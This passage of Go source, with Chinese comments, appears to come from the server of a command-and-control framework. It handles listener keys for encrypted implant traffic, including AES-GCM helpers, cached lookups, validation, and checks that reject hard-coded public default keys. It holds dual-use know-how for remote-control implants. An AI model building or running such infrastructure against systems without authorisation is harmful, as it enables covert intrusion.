// GetAllKeyStatus 获取所有客户端的密钥状态
func (skm *SecureKeyManager) GetAllKeyStatus() map[string]interface{} {
	allStatus := make(map[string]interface{})
	skm.sessionKeys.Range(func(key, value interface{}) bool {
		clientID := key.(string)
		status := skm.GetKeyStatus(clientID)
		allStatus[clientID] = status
		return true
	})
	return allStatus
}

// GetKeyMetrics 获取密钥系统统计信息
func (skm *SecureKeyManager) GetKeyMetrics() map[string]interface{} {
	metrics := map[string]interface{}{
		"total_sessions":     0,
		"active_sessions":    0,
		"expired_sessions":   0,
		"sessions_with_next": 0,
		"overlap_duration":   skm.GetOverlapDuration().String(),
		"rotation_enabled":   skm.IsRotationEnabled(),
	}

	totalSessions := 0
	activeSessions := 0
	expiredSessions := 0
	sessionsWithNext := 0

	skm.sessionKeys.Range(func(key, value interface{}) bool {
		totalSessions++
		keySet := value.(*SessionKeySet)
		keySet.mu.RLock()

		if keySet.CurrentKey != nil {
			if time.Now().Before(keySet.CurrentKey.ExpiresAt) {
				activeSessions++
			} else {
				expiredSessions++
			}
		}

		if keySet.NextKey != nil {
			sessionsWithNext++
		}

		keySet.mu.RUnlock()
		return true
	})

	metrics["total_sessions"] = totalSessions
	metrics["active_sessions"] = activeSessions
	metrics["expired_sessions"] = expiredSessions
	metrics["sessions_with_next"] = sessionsWithNext

	return metrics
}

// ========================= 监听器密钥配置管理 =========================

// EncryptWithMasterKeyRaw 用指定监听器主密钥 AES-GCM 加密（MetaInfo 传输，客户端对称实现）。
// 【加密体系改造】MetaInfo 不再使用 AES-CFB 密钥前置明文（截获即解密），统一 AES-GCM。
func EncryptWithMasterKeyRaw(data, masterKey []byte) ([]byte, error) {
	if len(masterKey) < 32 {
		return nil, errors.New("主密钥无效")
	}
	gcm, err := getServerAEAD(masterKey)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, data, nil), nil
}

// DecryptWithMasterKeyRaw 用指定监听器主密钥 AES-GCM 解密（MetaInfo 传输）
func DecryptWithMasterKeyRaw(data, masterKey []byte) ([]byte, error) {
	if len(masterKey) < 32 {
		return nil, errors.New("主密钥无效")
	}
	gcm, err := getServerAEAD(masterKey)
	if err != nil {
		return nil, err
	}
	if len(data) < gcm.NonceSize() {
		return nil, errors.New("密文过短")
	}
	return gcm.Open(nil, data[:gcm.NonceSize()], data[gcm.NonceSize():], nil)
}

// serverAEADCache 按密钥缓存 GCM 实例（与客户端 aeadCache 对称）
var serverAEADCache sync.Map

func getServerAEAD(key []byte) (cipher.AEAD, error) {
	k := string(key)
	if v, ok := serverAEADCache.Load(k); ok {
		return v.(cipher.AEAD), nil
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("创建密码块失败: %v", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("创建 GCM 失败: %v", err)
	}
	serverAEADCache.Store(k, gcm)
	return gcm, nil
}

// GenerateListenerKeyConfig 生成随机的监听器主密钥(VKey)与加密盐(EncryptionSalt)。
// 用于新建监听器时未指定密钥的场景，避免所有部署共用公开默认常量
// (initial_master_key_12345678901 / initial_salt_123) 而成为可预测密钥。
// 返回 base64 编码：VKey=base64(32字节)，Salt=base64(16字节)。
// 消费方（GetListenerKeyConfig / 客户端）以 copy(masterKey, []byte(vkey)) 取前 32/16 字节，两侧一致即可。
func GenerateListenerKeyConfig() (vkey string, salt string) {
	keyBytes := make([]byte, 32)
	if _, err := rand.Read(keyBytes); err != nil {
		// crypto/rand 失败极少见；退化到时间相关填充，绝不用公开常量
		for i := range keyBytes {
			keyBytes[i] = byte(time.Now().UnixNano() >> uint(i%64))
		}
	}
	saltBytes := make([]byte, 16)
	if _, err := rand.Read(saltBytes); err != nil {
		for i := range saltBytes {
			saltBytes[i] = byte(time.Now().UnixNano() >> uint(i%64))
		}
	}
	return base64.StdEncoding.EncodeToString(keyBytes), base64.StdEncoding.EncodeToString(saltBytes)
}

// listenerKeyCache 缓存按 type/address 解析的监听器密钥配置，避免每个 FirstBlood 重复查库
// （单个 FirstBlood 曾触发 2~3 次相同查询）。监听器增删/改/开/关/重置时调 InvalidateListenerKeyCache 失效。
// P1-2C: 加 5m TTL，超时自动失效，避免监听器密钥变更后 stale 读
// 返回的 []byte 视为只读，调用方不得修改。
type listenerKeyCacheEntry struct {
	masterKey, salt []byte
	at              time.Time
}

var listenerKeyCache sync.Map // key: "type:"+type 或 "addr:"+address

// InvalidateListenerKeyCache 清空监听器密钥配置缓存（监听器变更时调用）。
func InvalidateListenerKeyCache() {
	listenerKeyCache.Range(func(k, v any) bool {
		listenerKeyCache.Delete(k)
		return true
	})
}

// GetListenerKeyConfigForForward 正向连接专用密钥查找：按监听器类型查库（不要求 status=1），
// 未配置记录时回退到 GetListenerKeyConfig。正向客户端生成与派生都用它，保证两边密钥一致。
func GetListenerKeyConfigForForward(listenerType string) ([]byte, []byte) {
	if database.DB() != nil {
		var listener database.Listener
		if has, _ := database.DB().Where("type = ?", listenerType).Get(&listener); has {
			if listener.VKey != "" || listener.EncryptionSalt != "" {
				masterKey := make([]byte, 32)
				copy(masterKey, []byte(listener.VKey))
				salt := make([]byte, 16)
				copy(salt, []byte(listener.EncryptionSalt))
				logx.Infof("🔑 [KEY-CONFIG] 使用%s监听器记录的密钥配置（正向）\n", listenerType)
				return masterKey, salt
			}
		}
	}
	return GetListenerKeyConfig(listenerType)
}

// GetListenerKeyConfig 获取监听器的密钥配置
// 返回主密钥和加密盐，如果监听器没有配置则返回默认值
func GetListenerKeyConfig(listenerType string) ([]byte, []byte) {
	// 默认密钥配置（兼容性）
	defaultMasterKey := make([]byte, 32)
	copy(defaultMasterKey, []byte("initial_master_key_12345678901"))
	for i := len("initial_master_key_12345678901"); i < 32; i++ {
		defaultMasterKey[i] = 0
	}

	defaultSalt := make([]byte, 16)
	copy(defaultSalt, []byte("initial_salt_123"))

	// 正向监听器类型使用与客户端占位符一致的默认配置（tcp_forward / kcp_forward / ws_forward / http_forward / https_forward）
	if listenerType == "tcp_forward" || listenerType == "kcp_forward" || listenerType == "ws_forward" ||
		listenerType == "http_forward" || listenerType == "https_forward" {
		// 使用与客户端占位符相同的配置
		forwardMasterKey := make([]byte, 32)
		copy(forwardMasterKey, []byte("LISTENER_MASTER_KEY_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"))

		forwardSalt := make([]byte, 16)
		copy(forwardSalt, []byte("LISTENER_SALT_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"))

		logx.Infof("🔑 [KEY-CONFIG] 使用%s监听器特殊默认配置（与客户端占位符一致）\n", listenerType)
		return forwardMasterKey, forwardSalt
	}

	// 如果没有指定监听器类型，返回默认配置
	if listenerType == "" {
		return defaultMasterKey, defaultSalt
	}

	// 缓存命中（5m TTL）
	if v, ok := listenerKeyCache.Load("type:" + listenerType); ok {
		if e := v.(*listenerKeyCacheEntry); time.Since(e.at) < 5*time.Minute {
			return e.masterKey, e.salt
		}
		listenerKeyCache.Delete("type:" + listenerType)
	}

	// 查询数据库中的监听器配置
	if database.DB() == nil {
		logx.Warnf("⚠️ [KEY-CONFIG] 数据库未初始化，使用默认密钥配置\n")
		return defaultMasterKey, defaultSalt
	}

	var listener database.Listener
	has, err := database.DB().Where("type = ? AND status = 1", listenerType).Get(&listener)
	if err != nil {
		logx.Warnf("⚠️ [KEY-CONFIG] 查询监听器配置失败: %v，使用默认密钥配置\n", err)
		return defaultMasterKey, defaultSalt
	}

	if !has {
		// 常规路径（未配置监听器密钥 = 默认密钥），仅 debug 时输出，避免启动/每次连接刷屏
		if EnableKeyDebugLog {
			logx.Debugf("🔍 [KEY-CONFIG] 未找到活跃的%s监听器，使用默认密钥配置\n", listenerType)
		}
		return defaultMasterKey, defaultSalt
	}

	// 处理VKey（主密钥）
	masterKey := defaultMasterKey
	if listener.VKey != "" {
		masterKey = make([]byte, 32)
		copy(masterKey, []byte(listener.VKey))
		// 如果VKey长度不足32字节，用零填充
		for i := len(listener.VKey); i < 32; i++ {
			masterKey[i] = 0
		}
		logx.Infof("🔑 [KEY-CONFIG] 使用监听器%s的自定义VKey\n", listenerType)
	}

	// 处理EncryptionSalt（加密盐）
	encryptionSalt := defaultSalt
	if listener.EncryptionSalt != "" {
		encryptionSalt = make([]byte, 16)
		copy(encryptionSalt, []byte(listener.EncryptionSalt))
		// 如果盐长度不足16字节，用零填充
		for i := len(listener.EncryptionSalt); i < 16; i++ {
			encryptionSalt[i] = 0
		}
		logx.Infof("🧂 [KEY-CONFIG] 使用监听器%s的自定义加密盐\n", listenerType)
	}

	// 缓存命中路径（listener 行存在）；变更时由 InvalidateListenerKeyCache 清空
	listenerKeyCache.Store("type:"+listenerType, &listenerKeyCacheEntry{masterKey, encryptionSalt, time.Now()})

	return masterKey, encryptionSalt
}

// NormalizeListenerKeyConfig 将监听器 VKey/加密盐规范化为与客户端一致的 32/16 字节。
// 客户端以 copy(masterKey, []byte(vkey)) 取前 32 字节、盐取前 16 字节；
// 服务端 FirstBlood 收到显式覆盖密钥时也必须按同样规则切片，
// 否则超长 VKey（如 base64 44 字符）会导致 HKDF 输入不一致、GCM 认证失败。
func NormalizeListenerKeyConfig(vkey, salt []byte) ([]byte, []byte) {
	masterKey := make([]byte, 32)
	copy(masterKey, vkey)
	encryptionSalt := make([]byte, 16)
	copy(encryptionSalt, salt)
	return masterKey, encryptionSalt
}

// GetListenerKeyConfigByAddress 根据监听地址获取监听器密钥配置
func GetListenerKeyConfigByAddress(listenAddress string) ([]byte, []byte) {
	// 默认密钥配置（兼容性）
	defaultMasterKey := make([]byte, 32)
	copy(defaultMasterKey, []byte("initial_master_key_12345678901"))
	for i := len("initial_master_key_12345678901"); i < 32; i++ {
		defaultMasterKey[i] = 0
	}

	defaultSalt := make([]byte, 16)
	copy(defaultSalt, []byte("initial_salt_123"))

	// 如果没有指定监听地址，返回默认配置
	if listenAddress == "" {
		return defaultMasterKey, defaultSalt
	}

	// 缓存命中（按地址查询不依赖 status，缓存最稳定；5m TTL）
	if v, ok := listenerKeyCache.Load("addr:" + listenAddress); ok {
		if e := v.(*listenerKeyCacheEntry); time.Since(e.at) < 5*time.Minute {
			return e.masterKey, e.salt
		}
		listenerKeyCache.Delete("addr:" + listenAddress)
	}

	// 查询数据库中的监听器配置
	if database.DB() == nil {
		logx.Warnf("⚠️ [KEY-CONFIG] 数据库未初始化，使用默认密钥配置\n")
		return defaultMasterKey, defaultSalt
	}

	var listener database.Listener
	has, err := database.DB().Where("connect_address = ?", listenAddress).Get(&listener)
	if EnableKeyDebugLog {
		logx.Debugf("🔍 [KEY-CONFIG] 查询数据库 - SQL: WHERE connect_address = '%s'\n", listenAddress)
	}
	if err != nil {
		if EnableKeyDebugLog {
			logx.Warnf("⚠️ [KEY-CONFIG] 查询监听器配置失败: %v，使用默认密钥配置\n", err)
		}
		return defaultMasterKey, defaultSalt
	}

	if !has {
		// 常规路径（未配置监听器密钥 = 默认密钥），仅 debug 时输出，避免启动/每次连接刷屏
		if EnableKeyDebugLog {
			logx.Debugf("🔍 [KEY-CONFIG] 未找到连接地址%s的监听器，使用默认密钥配置\n", listenAddress)
		}
		return defaultMasterKey, defaultSalt
	}

	if EnableKeyDebugLog {
		logx.Infof("✅ [KEY-CONFIG] 找到监听器配置 - ID: %d, VKeyLen=%d, SaltLen=%d\n", listener.Id, len(listener.VKey), len(listener.EncryptionSalt))
	}

	// 处理VKey（主密钥）
	masterKey := defaultMasterKey
	if listener.VKey != "" {
		masterKey = make([]byte, 32)
		copy(masterKey, []byte(listener.VKey))
		// 如果VKey长度不足32字节，用零填充
		for i := len(listener.VKey); i < 32; i++ {
			masterKey[i] = 0
		}
		logx.Infof("🔑 [KEY-CONFIG] 使用监听器%s的自定义VKey\n", listenAddress)
	}

	// 处理EncryptionSalt（加密盐）
	encryptionSalt := defaultSalt
	if listener.EncryptionSalt != "" {
		encryptionSalt = make([]byte, 16)
		copy(encryptionSalt, []byte(listener.EncryptionSalt))
		// 如果盐长度不足16字节，用零填充
		for i := len(listener.EncryptionSalt); i < 16; i++ {
			encryptionSalt[i] = 0
		}
		logx.Infof("🧂 [KEY-CONFIG] 使用监听器%s的自定义加密盐\n", listenAddress)
	}

	// 缓存命中路径（listener 行存在）
	listenerKeyCache.Store("addr:"+listenAddress, &listenerKeyCacheEntry{masterKey, encryptionSalt, time.Now()})

	return masterKey, encryptionSalt
}

// 监听器密钥的长度约定：派生时只取 VKey 前 32 字节作主密钥、加密盐前 16 字节作盐
// （见 GetListenerKeyConfig / NormalizeListenerKeyConfig 与客户端 app.GetListenerKeyConfig），
// 多余字节被忽略。故录入要求至少覆盖这 32/16 字节——短于此则派生密钥尾部是零填充，
// 有效强度低于字面长度所暗示的。
// 注意：不能反过来限制"不超过 32/16 字节"——后端 GenerateListenerKeyConfig 产出
// base64(32B)=44 字符、前端"随机"按钮产出 hex(32B)=64 字符，都会被这种上限误杀
// （曾导致系统自己生成的密钥无法通过 /key-management 的校验）。
const (
	ListenerKeyMinVKeyLen = 32
	ListenerKeyMinSaltLen = 16
	// 仅用于拦掉误粘贴的超长内容；超出部分本就不参与派生
	ListenerKeyMaxLen = 128
)

// ValidateListenerKeyLength 校验显式提交的密钥长度。空串表示"不修改"（更新接口留空
// 即沿用旧值），跳过对应项——否则编辑既有短密钥监听器的备注都会被旧密钥拖累而被拒。
func ValidateListenerKeyLength(vkey, encryptionSalt string) error {
	if vkey != "" && len(vkey) < ListenerKeyMinVKeyLen {
		return fmt.Errorf("VKey 至少 %d 字节（派生只取前 %d 字节，过短会导致密钥尾部零填充），当前 %d 字节",
			ListenerKeyMinVKeyLen, ListenerKeyMinVKeyLen, len(vkey))
	}
	if encryptionSalt != "" && len(encryptionSalt) < ListenerKeyMinSaltLen {
		return fmt.Errorf("加密盐至少 %d 字节（派生只取前 %d 字节），当前 %d 字节",
			ListenerKeyMinSaltLen, ListenerKeyMinSaltLen, len(encryptionSalt))
	}
	if len(vkey) > ListenerKeyMaxLen || len(encryptionSalt) > ListenerKeyMaxLen {
		return fmt.Errorf("VKey/加密盐长度不能超过 %d 字节", ListenerKeyMaxLen)
	}
	return nil
}

// ValidateListenerKeyConfig 监听器密钥配置的完整校验（新建入口使用）：
// 非空 + 非公开默认值/占位符 + 长度。
func ValidateListenerKeyConfig(vkey, encryptionSalt string) error {
	if err := ValidateListenerKeyConfigForStart(vkey, encryptionSalt); err != nil {
		return err
	}
	return ValidateListenerKeyLength(vkey, encryptionSalt)
}

// ValidateListenerKeyConfigForStart 启动/生成前的密钥检查：空密钥与公开默认值/占位符一律拒绝。
// 与 handleOpenPort 的 J4 启动强制、AddListener 的入库前校验、PatchClientBinary 的生成闸门
// 共用同一份判定，避免多处漂移。
// 这里不含长度要求：长度档（ValidateListenerKeyLength）只施加于录入入口——升级后已存在的
// 短密钥监听器不该因为新策略直接起不来。
// 默认密钥（initial_master_key_12345678901 / initial_salt_123 / LISTENER_*_AAAA 占位符）
// 是公开常量：流量可解密、可伪造客户端劫持会话。
func ValidateListenerKeyConfigForStart(vkey, salt string) error {
	if vkey == "" || salt == "" {
		return fmt.Errorf("VKey/加密盐不能为空")
	}
	mk := make([]byte, 32)
	copy(mk, []byte(vkey))
	sl := make([]byte, 16)
	copy(sl, []byte(salt))
	if IsDefaultListenerKey(mk, sl) {
		return fmt.Errorf("VKey/加密盐不能使用公开默认值或占位符（可预测，流量可解密、可伪造客户端）")
	}
	return nil
}

// GetAllListenerKeyConfigs 获取所有监听器的密钥配置信息
func GetAllListenerKeyConfigs() ([]map[string]interface{}, error) {
	if database.DB() == nil {
		return nil, fmt.Errorf("数据库未初始化")
	}

	var listeners []database.Listener
	err := database.DB().Find(&listeners)
	if err != nil {
		return nil, fmt.Errorf("查询监听器列表失败: %v", err)
	}

	configs := make([]map[string]interface{}, 0, len(listeners))
	for _, listener := range listeners {
		config := map[string]interface{}{
			"id":              listener.Id,
			"type":            listener.Type,
			"listen_address":  listener.ListenAddress,
			"status":          listener.Status,
			"has_custom_vkey": listener.VKey != "",
			"has_custom_salt": listener.EncryptionSalt != "",
			"vkey_length":     len(listener.VKey),
			"salt_length":     len(listener.EncryptionSalt),
		}

		// 只在调试模式下显示实际密钥值（安全考虑）
		if listener.VKey != "" {
			config["vkey_preview"] = listener.VKey[:min(len(listener.VKey), 8)] + "..."
		}
		if listener.EncryptionSalt != "" {
			config["salt_preview"] = listener.EncryptionSalt[:min(len(listener.EncryptionSalt), 4)] + "..."
		}

		configs = append(configs, config)
	}

	return configs, nil
}

// min 辅助函数
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// IsDefaultListenerKey 判断监听器是否仍在使用公开默认密钥/盐
// （J4: 默认密钥可解密全部 C2 流量、可伪造客户端劫持会话 → firstBlood 拒绝 + 启动检查）
// 识别两类公开常量：
//  1. 历史默认密钥 initial_master_key_12345678901 / initial_salt_123
//  2. 客户端二进制占位符未替换的密钥（forward 变体共享，公开可预测；
//     未 patch 的客户端以其加密上线，服务端若放行则流量可被任何持有源码者解密）
func IsDefaultListenerKey(masterKey, salt []byte) bool {
	defaultMK := make([]byte, 32)
	copy(defaultMK, []byte("initial_master_key_12345678901"))
	for i := len("initial_master_key_12345678901"); i < 32; i++ {
		defaultMK[i] = 0
	}
	defaultSalt := make([]byte, 16)
	copy(defaultSalt, []byte("initial_salt_123"))

	if len(masterKey) > 0 && string(masterKey) == string(defaultMK) {
		return true
	}
	if len(salt) > 0 && string(salt) == string(defaultSalt) {
		return true
	}

	// 客户端占位符（LISTENER_MASTER_KEY_ + 32×A / LISTENER_SALT_ + 34×A）
	// copy 截断规则与客户端 keyconfig.go / 本文件 GetListenerKeyConfig forward 分支一致：
	// 主密钥取前 32 字节（"LISTENER_MASTER_KEY_" + 12×A），盐取前 16 字节（"LISTENER_SALT_" + 2×A）
	placeholderMK := "LISTENER_MASTER_KEY_" + strings.Repeat("A", 12)
	placeholderSalt := "LISTENER_SALT_" + strings.Repeat("A", 2)
	if len(masterKey) >= 32 && string(masterKey[:32]) == placeholderMK {
		return true
	}
	if len(salt) >= 16 && string(salt[:16]) == placeholderSalt {
		return true
	}

	// 前端兜底默认密钥（payloadUtil.ts 的 DEFAULT_VKEY / DEFAULT_ENCRYPT_SALT，公开常量）。
	// 前端匹配不到监听器密钥时会回退到它们——同样拒绝，避免生成
	// 流量可解密 / 与服务端会话密钥不一致（上线即解密失败）的载荷。
	frontDefaultMK := make([]byte, 32)
	copy(frontDefaultMK, []byte("HlTKzBWsfWTEFaFkewvNeFaFK6R6sY6Q"))
	frontDefaultSalt := make([]byte, 16)
	copy(frontDefaultSalt, []byte("f8uulfgNYpnpAhwd"))
	if len(masterKey) >= 32 && string(masterKey[:32]) == string(frontDefaultMK) {
		return true
	}
	if len(salt) >= 16 && string(salt[:16]) == string(frontDefaultSalt) {
		return true
	}
	return false
}
